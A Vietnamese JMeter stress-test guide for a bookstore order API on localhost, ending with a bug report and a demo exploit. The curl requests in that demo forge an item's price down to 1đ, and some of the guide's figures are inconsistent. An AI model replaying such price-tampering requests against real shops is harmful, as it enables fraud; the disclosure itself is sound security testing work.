# Hướng Dẫn Cấu Hình JMeter - TG_06: Create Order (Transaction Stress Test)

## Thông Tin Test

| Thuộc tính | Giá trị |
|---|---|
| **Mục tiêu** | Đo hiệu năng tạo đơn hàng — transaction phức tạp nhất hệ thống |
| **API** | `POST /api/v1/orders` |
| **Server** | `localhost` |
| **Port** | `8888` (API Gateway) |
| **Threads** | 200 (tăng dần — Stress Test) |
| **Ramp-up** | 10 giây |
| **Loop** | 5 |
| **Duration** | ~10 phút |
| **Target throughput** | 20 req/s |
| **SLA** | p95 < 3000ms, p99 < 5000ms, Error < 5% |
| **Loại test** | ⚡ **Stress Test** |
| **Auth** | ✅ **Cần Bearer Token** |

> 💡 **Tại sao Create Order là transaction phức tạp nhất?**
> Một request tạo đơn hàng thực hiện **tất cả** các bước sau trong 1 transaction:
> 1. Validate user và địa chỉ giao hàng
> 2. Kiểm tra tồn kho variant (gọi sang **Product Service**)
> 3. Giảm stock variant (gọi sang **Product Service**)
> 4. Tính tổng tiền (có thể áp dụng voucher)
> 5. Tạo Order + OrderItems trong DB
> 6. Xóa items khỏi Cart
> 7. Cập nhật rank user (gọi sang **Identity Service**)
>
> → Nếu bất kỳ bước nào fail → rollback toàn bộ → **dễ deadlock, timeout, race condition**.

---

## Bước 1: Chuẩn Bị Trước Khi Vào JMeter

### 1.1. Kiểm tra API hoạt động

Lấy token:
```powershell
curl -X POST "http://localhost:8888/api/v1/identity/auth/token" -H "Content-Type: application/json" -d "{\"username\": \"testuser001\", \"password\": \"Test@123456\"}"
```

Lấy address_id (cần có địa chỉ trong DB):
```powershell
curl -H "Authorization: Bearer <TOKEN>" "http://localhost:8888/api/v1/profile/addresses/my-address"
```

Test thử tạo đơn hàng:
```powershell
curl -X POST "http://localhost:8888/api/v1/orders" ^
  -H "Content-Type: application/json" ^
  -H "Authorization: Bearer <TOKEN>" ^
  -d "{\"items\":[{\"variantId\":1,\"quantity\":1}],\"addressId\":1,\"paymentMethod\":\"COD\",\"voucherCode\":null}"
```
> ✅ Trả về JSON có `"result"` kèm order ID → OK.

### 1.2. File CSV users đã có sẵn

```
test_JMeter\data\data_user\users.csv
```
Format: `username,password` — 100 users.

### 1.3. File CSV variant_ids đã có sẵn

```
test_JMeter\data\data_chung\variant_ids.csv
```
> ⚠️ Cập nhật file này với variant_id có **stock > 0** từ DB (variant 1–5 đã xác nhận có stock).

### 1.4. Tạo file CSV address IDs

Tạo file `address_ids.csv` tại:
```
test_JMeter\data\data_chung\address_ids.csv
```

> ⚠️ Dùng lệnh PowerShell no-BOM:

```powershell
$content = "address_id`n1`n2`n3`n4`n5"
[System.IO.File]::WriteAllText(
  "C:\Users\Admin\Desktop\PTIT\Y4_T2\QA\SQA\test_JMeter\data\data_chung\address_ids.csv",
  $content,
  [System.Text.UTF8Encoding]::new($false)
)
```

> 💡 **address_id phải tồn tại trong DB của testuser.** Kiểm tra bằng curl với token của testuser001 (xem Bước 1.1). Nếu chưa có địa chỉ → tạo thủ công trước khi test.

---

## Bước 2: Thêm Thread Group (TG_06) — Stress Test Config

**Chuột phải vào Test Plan** → **Add → Threads (Users) → Thread Group**

Đặt tên: **`TG_06 - Create Order Transaction Stress Test`**

| Trường | Giá trị | Giải thích |
|---|---|---|
| Number of Threads | `200` | Tăng lên để tạo đủ tải stress |
| Ramp-up period | `10` | Tăng nhanh hơn để mô phỏng tải đột ngột |
| Loop Count | `5` | Mỗi user tạo 5 đơn — tạo đủ tải stress test |

> 💡 **Tổng request**: 200 threads × 5 loops = **1000 requests**
> Create Order là transaction **nặng nhất** — mỗi request:
> - Gọi sang Product Service 2 lần (check stock + reduce stock)
> - Gọi sang Identity Service 1 lần (update rank)
> - Ghi vào 3+ bảng trong DB (orders, order_items, cart_items xóa)
>
> 200 threads với ramp-up 10s tạo áp lực lớn để test breaking point.

---

## Bước 3: Thêm CSV Data Set Config — Users

**Chuột phải vào TG_06** → **Add → Config Element → CSV Data Set Config**

Đặt tên: **`CSV - Users`**

| Trường | Giá trị | Giải thích |
|---|---|---|
| **Filename** | `C:\Users\Admin\Desktop\PTIT\Y4_T2\QA\SQA\test_JMeter\data\data_user\users.csv` | |
| **Variable Names** | `username,password` | |
| **Ignore first line** | `True` | |
| **Delimiter** | `,` | |
| **Recycle on EOF** | `True` | 200 × 5 = 1000 requests > 100 users → cần recycle |
| **Stop thread on EOF** | `False` | |
| **Sharing mode** | `All threads` | |

---

## Bước 4: Thêm CSV Data Set Config — Variant IDs

**Chuột phải vào TG_06** → **Add → Config Element → CSV Data Set Config**

Đặt tên: **`CSV - Variant IDs`**

| Trường | Giá trị | Giải thích |
|---|---|---|
| **Filename** | `C:\Users\Admin\Desktop\PTIT\Y4_T2\QA\SQA\test_JMeter\data\data_chung\variant_ids.csv` | |
| **Variable Names** | `variant_id` | |
| **Ignore first line** | `True` | |
| **Recycle on EOF** | `True` | Chỉ 5 variants — cần recycle |
| **Stop thread on EOF** | `False` | |
| **Sharing mode** | `All threads` | |

---

## Bước 5: Thêm CSV Data Set Config — Address IDs

**Chuột phải vào TG_06** → **Add → Config Element → CSV Data Set Config**

Đặt tên: **`CSV - Address IDs`**

| Trường | Giá trị | Giải thích |
|---|---|---|
| **Filename** | `C:\Users\Admin\Desktop\PTIT\Y4_T2\QA\SQA\test_JMeter\data\data_chung\address_ids.csv` | |
| **Variable Names** | `address_id` | |
| **Ignore first line** | `True` | |
| **Recycle on EOF** | `True` | |
| **Stop thread on EOF** | `False` | |
| **Sharing mode** | `All threads` | |

---

## Bước 6: Thêm HTTP Request Defaults

**Chuột phải vào TG_06** → **Add → Config Element → HTTP Request Defaults**

| Trường | Giá trị |
|---|---|
| **Server Name or IP** | `localhost` |
| **Port Number** | `8888` |
| **Protocol** | `http` |

---

## Bước 7: Thêm HTTP Header Manager (Global)

**Chuột phải vào TG_06** → **Add → Config Element → HTTP Header Manager**

Đặt tên: **`Header - Global`**

| Name | Value |
|---|---|
| `Content-Type` | `application/json` |
| `Accept` | `application/json` |

> ⚠️ **Không đặt Authorization ở đây** — đặt vào trong từng request cần token (giống cách đã học từ TG_05).

---

## Bước 8: Thêm Constant Throughput Timer (20 req/s)

**Chuột phải vào TG_06** → **Add → Timer → Constant Throughput Timer**

| Trường | Giá trị | Giải thích |
|---|---|---|
| **Target throughput** | `1200` | 20 req/s × 60 = 1200 req/phút |
| **Calculate based on** | `All active threads in current thread group` | |

> 💡 **Tại sao chỉ 20 req/s — thấp nhất trong tất cả TG?**
> Create Order là API **tốn tài nguyên nhất**:
> - Mỗi request = 3 cross-service calls + multiple DB writes
> - 20 req/s → 20 transactions/giây → 20 lần gọi chéo service mỗi giây
>
> So sánh: TG_02 (product list) 100 req/s chỉ là 100 SELECT queries đơn giản.

---

## Bước 9: Thêm HTTP Request — Login (Lấy Token)

**Chuột phải vào TG_06** → **Add → Sampler → HTTP Request**

Đặt tên: **`POST - Login (Get Token)`**

| Trường | Giá trị |
|---|---|
| **Method** | `POST` |
| **Path** | `/api/v1/identity/auth/token` |

Tab **Body Data**:
```json
{"username": "${username}", "password": "${password}"}
```

### 9.1. Thêm JSON Extractor

**Chuột phải vào "POST - Login"** → **Add → Post Processors → JSON Extractor**

| Trường | Giá trị |
|---|---|
| Name | `Extract - ACCESS_TOKEN` |
| **Names of created variables** | `ACCESS_TOKEN` |
| **JSON Path expressions** | `$.result.token` |
| **Default Value** | `TOKEN_NOT_FOUND` |

---

## Bước 10: Thêm HTTP Request — Create Order

**Chuột phải vào TG_06** → **Add → Sampler → HTTP Request**

Đặt tên: **`POST - /api/v1/orders`**

| Trường | Giá trị |
|---|---|
| **Method** | `POST` |
| **Path** | `/api/v1/orders` |

Tab **Body Data**:
```json
{"items":[{"variantId":${variant_id},"quantity":1}],"addressId":${address_id},"paymentMethod":"COD","voucherCode":null}
```

> 💡 **Giải thích body:**
> - `items`: Mảng sản phẩm — dùng `${variant_id}` từ CSV
> - `addressId`: Địa chỉ giao hàng — dùng `${address_id}` từ CSV
> - `paymentMethod`: `"COD"` (Thanh toán khi nhận hàng) — đơn giản nhất, không cần gọi Payment Service
> - `voucherCode`: `null` — không dùng voucher để tránh thêm complexity

### 10.1. Thêm HTTP Header Manager (Authorization) — bên trong Order Request

**Chuột phải vào "POST - /api/v1/orders"** → **Add → Config Element → HTTP Header Manager**

| Name | Value |
|---|---|
| `Authorization` | `Bearer ${ACCESS_TOKEN}` |

> ⚠️ **Đặt Header Manager này bên TRONG request `/api/v1/orders`**, không phải ở cấp TG.  
> (Bài học từ TG_05: Authorization ở cấp TG sẽ bị gửi cả vào Login request → 401)

---

## Bước 11: Thêm Các Assertions

### 11.1. Kiểm tra Status Code = 200

**Chuột phải vào "POST - /api/v1/orders"** → **Add → Assertions → Response Assertion**

| Trường | Giá trị |
|---|---|
| Name | `Assert - Status 200` |
| **Field to Test** | `Response Code` |
| Pattern Matching | `Equals` |
| Pattern | `200` |

### 11.2. Kiểm tra Body chứa "result"

**Chuột phải vào "POST - /api/v1/orders"** → **Add → Assertions → Response Assertion**

| Trường | Giá trị |
|---|---|
| Name | `Assert - Body has result` |
| **Field to Test** | `Text Response` |
| Pattern Matching | `Contains` |
| Pattern | `result` |

### 11.3. Kiểm tra Response Time < 8000ms

**Chuột phải vào "POST - /api/v1/orders"** → **Add → Assertions → Duration Assertion**

| Trường | Giá trị | Giải thích |
|---|---|---|
| Name | `Assert - Response Time < 8000ms` |
| **Duration** | `8000` | Thoáng nhất trong tất cả TG — transaction phức tạp nhất |

> 💡 **So sánh Duration Assertion:**
> - TG_01 Login: 2000ms
> - TG_03 Advanced Search: 5000ms
> - TG_05 Add Cart: 3000ms
> - TG_06 Create Order: **8000ms** — phức tạp nhất, chấp nhận chậm nhất

---

## Bước 12: Thêm Listeners

**Chuột phải vào TG_06** → **Add → Listener:**

### 12.1. Aggregate Report ✅
Set file output:
```
C:\Users\Admin\Desktop\PTIT\Y4_T2\QA\SQA\test_JMeter\results\TG_06_result.csv
```

### 12.2. Response Time Graph ✅
> Theo dõi response time theo thời gian — quan sát xem transaction có chậm dần không (dấu hiệu deadlock hoặc connection pool cạn).

### 12.3. View Results Tree ⚠️ (chỉ debug)
> **Disable** trước khi chạy full test.

---

## Bước 13: Lưu Test Plan

```
C:\Users\Admin\Desktop\PTIT\Y4_T2\QA\SQA\test_JMeter\TG_06_CreateOrder_StressTest.jmx
```

---

## Bước 14: Chạy Test

### Cách 1: Chạy qua GUI
- Click **▶ Run** (Ctrl+R)
- Quan sát Response Time Graph — phát hiện nếu response time tăng dần theo thời gian (dấu hiệu resource leak)

### Cách 2: Chạy qua Command Line
```powershell
cd C:\apache-jmeter\bin

.\jmeter.bat -n `
  -t "C:\Users\Admin\Desktop\PTIT\Y4_T2\QA\SQA\test_JMeter\TG_06_CreateOrder_StressTest.jmx" `
  -l "C:\Users\Admin\Desktop\PTIT\Y4_T2\QA\SQA\test_JMeter\results\TG_06_result.jtl" `
  -e `
  -o "C:\Users\Admin\Desktop\PTIT\Y4_T2\QA\SQA\test_JMeter\results\TG_06_report"
```

---

## Bước 15: Đọc Kết Quả & Đánh Giá

### Metrics trong Aggregate Report:

| Metric | Ngưỡng Pass | Ý nghĩa |
|---|---|---|
| **90th Percentile** | < 2000ms | |
| **95th Percentile** | **< 3000ms** ✅ | SLA chính |
| **99th Percentile** | **< 5000ms** ✅ | SLA phụ |
| **Error %** | **< 5%** ✅ | Cao nhất trong tất cả TG — stress test có thể có lỗi |
| **Throughput** | ≥ 20 req/s | |

### Các lỗi thường gặp & ý nghĩa:

| Lỗi | HTTP Status | Nguyên nhân | Xử lý |
|---|---|---|---|
| `TOKEN_NOT_FOUND` → 401 | 401 | Login fail / Authorization header sai vị trí | Kiểm tra lại cây JMeter |
| `address not found` | 400/404 | address_id trong CSV không thuộc user này | Tạo địa chỉ cho testuser trước |
| `variant not found` | 400/404 | variant_id không tồn tại | Sửa CSV dùng ID có thật |
| `out of stock` | 400 | Stock variant = 0 sau nhiều lần order | Reset stock trong DB |
| `deadlock` → 500 | 500 | Nhiều thread cùng update 1 variant | **Đây là kết quả test mong muốn** |
| `connection timeout` | 500/503 | DB pool cạn, service quá tải | Ghi nhận breaking point |
| Response > 8000ms | — | Quá tải cross-service calls | Ghi nhận → cần optimize |

### Cảnh báo đặc biệt — Hết Stock:

> ⚠️ **Sau khi chạy TG_06**, stock của variant 1–5 sẽ bị giảm.  
> Nếu chạy nhiều lần → stock về 0 → tất cả request fail `out of stock`.  
> **Reset stock sau mỗi lần test:**
> ```sql
> UPDATE product_variant SET stock = 500 WHERE id IN (1, 2, 3, 4, 5);
> ```

---

## So Sánh TG_01 → TG_06

| | TG_01 | TG_02 | TG_03 | TG_04 | TG_05 | TG_06 |
|---|---|---|---|---|---|---|
| **Loại test** | Load | Load | Stress | Load | Spike | **Stress** |
| **Method** | POST | GET | GET | GET | POST | **POST** |
| **Auth** | Không | Không | Không | Không | Có | **Có** |
| **Login step** | Không | Không | Không | Không | Có | **Có** |
| **CSV count** | 1 | N/A | 1 | 1 | 2 | **3** |
| **Body** | JSON | — | — | — | JSON | **JSON phức tạp** |
| **Cross-service** | Không | Không | Không | Không | Không | **✅ 3 services** |
| **DB writes** | 1 | 0 | 0 | 0 | 1 | **3+** |
| **Ramp-up** | 60s | 60s | 120s | 60s | 5s | **10s** |
| **Threads** | 100 | 200 | 200 | 150 | 100 | **200** |
| **Loop** | 1 | 5 | 10 | 10 | 3 | **5** |
| **Throughput** | 50/s | 100/s | 30/s | 80/s | 50/s | **20/s** |
| **SLA p95** | 500ms | 800ms | 2000ms | 600ms | 1000ms | **3000ms** |
| **Duration Assert** | 2000ms | 2000ms | 5000ms | 2000ms | 3000ms | **8000ms** |
| **Risk** | High | High | Critical | High | High | **Critical** |

---

## Cấu Trúc Cuối Cùng Trong JMeter

```
📋 Test Plan: Bookstore Performance Test
└── 🧵 TG_06 - Create Order Transaction Stress Test [200 threads, 10s ramp-up, loop=5]
    ├── 📄 CSV Data Set Config: users.csv
    │       Variables: username, password
    ├── 📄 CSV Data Set Config: variant_ids.csv
    │       Variables: variant_id
    ├── 📄 CSV Data Set Config: address_ids.csv
    │       Variables: address_id
    ├── 🌐 HTTP Request Defaults: localhost:8888
    ├── 📋 HTTP Header Manager: Content-Type, Accept  (KHÔNG có Authorization)
    ├── ⏱️ Constant Throughput Timer: 1200 req/min (= 20 req/s)
    ├── 🔷 POST - Login (Get Token)
    │       Body: {"username": "${username}", "password": "${password}"}
    │   └── 🔍 JSON Extractor: $.result.token → ACCESS_TOKEN
    └── 🔷 POST - /api/v1/orders
            Body: {"items":[{"variantId":${variant_id},"quantity":1,"price":${price},
                             "productId":${product_id},"productName":"${product_name}","sku":"${sku}"}],
                   "addressId":${address_id},"paymentMethod":"COD","voucherCode":null}
        ├── 📋 Header - Authorization: Bearer ${ACCESS_TOKEN}  ← BÊN TRONG order request
        ├── ✅ Assert - Status 200
        ├── ✅ Assert - Body has result
        └── ✅ Assert - Response Time < 8000ms
    ├── 📊 Listener: Aggregate Report → TG_06_result.csv
    ├── 📊 Listener: Response Time Graph
    └── 📊 Listener: View Results Tree (DISABLE khi chạy full)
```

---

## Checklist Trước Khi Chạy

- [ ] Tất cả services đang chạy: Identity, Product, Order, Profile Service + API Gateway (8888)
- [ ] Test thủ công bằng curl → tạo đơn thành công ✅
- [ ] File `address_ids.csv` đã tạo no-BOM, address_id tồn tại trong DB
- [ ] File `variant_ids.csv` có đủ 5 cột: `variant_id,price,product_id,product_name,sku`
- [ ] Variant 1–5 có **stock > 50** (đủ cho 50 threads × 2 loops = 100 orders)
- [ ] `$.result.token` đúng với response thực tế
- [ ] **Authorization** đặt **bên trong** "POST - /api/v1/orders" (không ở cấp TG)
- [ ] Sau test: reset stock bằng SQL nếu cần chạy lại
- [ ] **Disable** View Results Tree trước khi chạy full
- [ ] Tạo thư mục `results/` nếu chưa có

---

## Bugs Phát Hiện Trong Quá Trình Testing

> Các lỗi dưới đây được phát hiện khi thực thi TG_06. Tất cả đều trả về **HTTP 500** do thiết kế backend không hợp lý.

### Bug #1 — `OrderItemRequest.getPrice()` is null

| Thuộc tính | Nội dung |
|---|---|
| **Mã lỗi** | `9999` |
| **HTTP Status** | `500 Internal Server Error` |
| **Stack trace** | `Cannot invoke "java.lang.Long.longValue()" because the return value of "com.example.order_service.dto.request.OrderItemRequest.getPrice()" is null` |
| **Nguyên nhân** | DTO `OrderItemRequest` có field `price` bắt buộc nhưng client không gửi lên |
| **Fix JMeter** | Thêm `"price":${price}` vào body, thêm cột `price` vào `variant_ids.csv` |

### Bug #2 — `OrderItemEntity.productId` is null

| Thuộc tính | Nội dung |
|---|---|
| **Mã lỗi** | `9999` |
| **HTTP Status** | `500 Internal Server Error` |
| **Stack trace** | `not-null property references a null or transient value: com.example.order_service.entity.OrderItemEntity.productId` |
| **Nguyên nhân** | Cột `product_id` trong bảng `order_items` có ràng buộc `NOT NULL`, nhưng DTO không map field này từ request |
| **Fix JMeter** | Thêm `"productId":${product_id}` vào body, thêm cột `product_id` vào `variant_ids.csv` |

### Bug #3 — `OrderItemEntity.productName` is null

| Thuộc tính | Nội dung |
|---|---|
| **Mã lỗi** | `9999` |
| **HTTP Status** | `500 Internal Server Error` |
| **Stack trace** | `not-null property references a null or transient value: com.example.order_service.entity.OrderItemEntity.productName` |
| **Nguyên nhân** | Cột `product_name` trong bảng `order_items` có ràng buộc `NOT NULL`, nhưng service không tự lookup tên sản phẩm |
| **Fix JMeter** | Thêm `"productName":"${product_name}"` vào body, thêm cột `product_name` vào `variant_ids.csv` |

---

### Phân Tích Root Cause — Thiết Kế API Sai

Ba bugs trên xuất phát từ **một quyết định thiết kế**: Order Service **không gọi Product Service** để lấy thông tin sản phẩm, mà yêu cầu client tự cung cấp tất cả.

```
❌ Thiết kế hiện tại:
Client ──────────────────────────────────────────────→ Order Service
  { variantId, productId, productName, sku, price,         │
    quantity }                                         Save to DB
                                                           ↑
                                              Không validate giá!

✅ Thiết kế đúng chuẩn:
Client ──────────────→ Order Service
  { variantId, quantity }     │
                              ├──→ GET /variants/{id}  (Product Service)
                              │←── { productId, productName, sku, price }
                              │
                        Validate & Save to DB
```

| Tiêu chí | Thiết kế hiện tại ❌ | Thiết kế đúng ✅ |
|---|---|---|
| Client gửi | `productId`, `productName`, `price`, `sku` | Chỉ `variantId` + `quantity` |
| Giá sản phẩm | Client tự khai báo — **không được validate** | Server fetch từ Product Service |
| Rủi ro bảo mật | User có thể sửa `price = 1` để mua hàng giá 1đ | Giá luôn lấy từ DB, không thể sửa |
| Tên sản phẩm | Client tự khai — có thể nhập sai | Server lookup đúng tên |
| Cross-service | Không có | Gọi Product Service trước khi lưu |

> 🔴 **Mức độ nghiêm trọng: Critical** — Lỗ hổng cho phép user thao túng giá đơn hàng. Cần fix trước khi deploy production.

### Chuỗi Lỗi Theo Thứ Tự Phát Hiện

```
Lần 1:  POST /api/v1/orders → 500: getPrice() is null
         Fix: thêm "price" vào body
         ↓
Lần 2:  POST /api/v1/orders → 500: productId is null
         Fix: thêm "productId" vào body
         ↓
Lần 3:  POST /api/v1/orders → 500: productName is null
         Fix: thêm "productName" vào body
         ↓
Lần 4:  POST /api/v1/orders → ??? (tiếp tục kiểm tra)
```

> 💡 Hibernate báo lỗi **từng field một** theo thứ tự nó gặp — đó là lý do phải fix nhiều vòng.

---

### Demo Khai Thác Lỗ Hổng — Price Manipulation Attack

> Đây là demo minh họa mức độ nghiêm trọng. Một user bình thường (có token hợp lệ) có thể mua sản phẩm với **giá tùy ý** bằng cách sửa request body.

#### Kịch bản tấn công

**Bước 1** — Lấy token hợp lệ (chạy trong **CMD**, không dùng PowerShell):

```cmd
curl -s -X POST "http://localhost:8888/api/v1/identity/auth/token" ^
  -H "Content-Type: application/json" ^
  -d "{\"username\":\"testuser001\",\"password\":\"Test@123456\"}"
```

> Copy giá trị `"token":"eyJ..."` từ response để dùng ở bước tiếp theo.

**Bước 2** — Gửi request **BÌNH THƯỜNG** (giá đúng — để làm baseline so sánh):

```cmd
curl -X POST "http://localhost:8888/api/v1/orders" ^
  -H "Content-Type: application/json" ^
  -H "Authorization: Bearer PASTE_TOKEN_HERE" ^
  -d "{\"items\":[{\"variantId\":4,\"productId\":2,\"productName\":\"MacBook Air M3 #0002\",\"sku\":\"SKU-0002-01\",\"quantity\":1,\"price\":24881000}],\"paymentMethod\":\"COD\",\"voucherCode\":null}"
```

> ✅ Kết quả mong đợi: `"code":1000`, `total` ≈ 24,881,000đ

**Bước 3** — Gửi request **TẤN CÔNG** (chỉ đổi `price` từ 24881000 → 1):

```cmd
curl -X POST "http://localhost:8888/api/v1/orders" ^
  -H "Content-Type: application/json" ^
  -H "Authorization: Bearer PASTE_TOKEN_HERE" ^
  -d "{\"items\":[{\"variantId\":4,\"productId\":2,\"productName\":\"MacBook Air M3 #0002\",\"sku\":\"SKU-0002-01\",\"quantity\":1,\"price\":1}],\"paymentMethod\":\"COD\",\"voucherCode\":null}"
```

> 🔴 Kết quả thực tế: `"code":1000`, `total` = **1đ** → Bug xác nhận!

**Bước 4** — Thay vì để hệ thống tính giá, user **tự gửi giá giả** (minh họa bằng diff):

```bash
# Request BÌNH THƯỜNG (giá đúng):
curl -X POST "http://localhost:8888/api/v1/orders" \
  -H "Authorization: Bearer <TOKEN_HOP_LE>" \
  -H "Content-Type: application/json" \
  -d '{
    "items": [{
      "variantId": 4,
      "productId": 2,
      "productName": "MacBook Air M3 #0002",
      "sku": "SKU-0002-01",
      "quantity": 1,
      "price": 24881000
    }],
    "paymentMethod": "COD",
    "voucherCode": null
  }'
# Kết quả: Đơn hàng tạo thành công, total = 24,881,000đ ✅

# ─────────────────────────────────────────────────────────

# Request TẤN CÔNG (giá giả — chỉ sửa field "price"):
curl -X POST "http://localhost:8888/api/v1/orders" \
  -H "Authorization: Bearer <TOKEN_HOP_LE>" \
  -H "Content-Type: application/json" \
  -d '{
    "items": [{
      "variantId": 4,
      "productId": 2,
      "productName": "MacBook Air M3 #0002",
      "sku": "SKU-0002-01",
      "quantity": 1,
      "price": 1
    }],
    "paymentMethod": "COD",
    "voucherCode": null
  }'
# Kết quả: Đơn hàng tạo thành công, total = 1đ 🔴 BUG NGHIÊM TRỌNG!
```

**Bước 3** — Hệ thống lưu đơn hàng với giá `1đ` vào DB:

```
order_items
┌────┬──────────┬────────────┬──────────────────────┬──────────────┬──────────┬─────┐
│ id │ order_id │ product_id │ product_name         │ variant_id   │ quantity │price│
├────┼──────────┼────────────┼──────────────────────┼──────────────┼──────────┼─────┤
│ 1  │  101     │ 2          │ MacBook Air M3 #0002 │ 4            │ 1        │  1  │ ← 😱
└────┴──────────┴────────────┴──────────────────────┴──────────────┴──────────┴─────┘
```

#### Timeline tấn công

```
User (kẻ tấn công)              Order Service              Database
       │                              │                        │
       │── POST /orders ─────────────→│                        │
       │   price: 1đ (giả mạo)        │                        │
       │                              │ (không gọi sang        │
       │                              │  Product Service)      │
       │                              │── INSERT order_items ──→│
       │                              │   price = 1đ           │
       │                              │←─ OK ──────────────────│
       │←─ 200 OK ────────────────────│                        │
       │   {"orderId": 101,           │                        │
       │    "total": 31đ}             │                        │
       │                              │                        │
       ↓                              ↓                        ↓
Mua MacBook 24tr                Không phát hiện          Lưu giá sai
với giá 1đ ✅                   bất kỳ lỗi nào           vĩnh viễn 💸
```

#### So sánh thiệt hại

| Sản phẩm | Giá thật | Giá kẻ tấn công gửi | Thiệt hại |
|---|---|---|---|
| MacBook Air M3 | 24,881,000đ | 1đ | **-24,880,999đ** |
| iPhone 15 | 14,329,000đ | 1đ | **-14,328,999đ** |
| Razer Blade 15 | 50,627,000đ | 1đ | **-50,626,999đ** |
| Mua 10 MacBook | 248,810,000đ | 10đ | **-248,809,990đ** |

#### Điều kiện để tấn công thành công

- [x] Có tài khoản hợp lệ (chỉ cần đăng ký)
- [x] Biết `variantId`, `productId`, `productName`, `sku` (lấy từ API product list — public)
- [x] Gửi `price = 1` trong body
- [x] Hệ thống chấp nhận và lưu

> 🔴 **Kết luận**: Đây là lỗ hổng **Price Manipulation** — thuộc nhóm [OWASP API4:2023 Unrestricted Resource Consumption / Business Logic Flaw](https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/). Mức độ: **Critical**. Hệ thống **không bao giờ được tin tưởng dữ liệu giá từ client**.
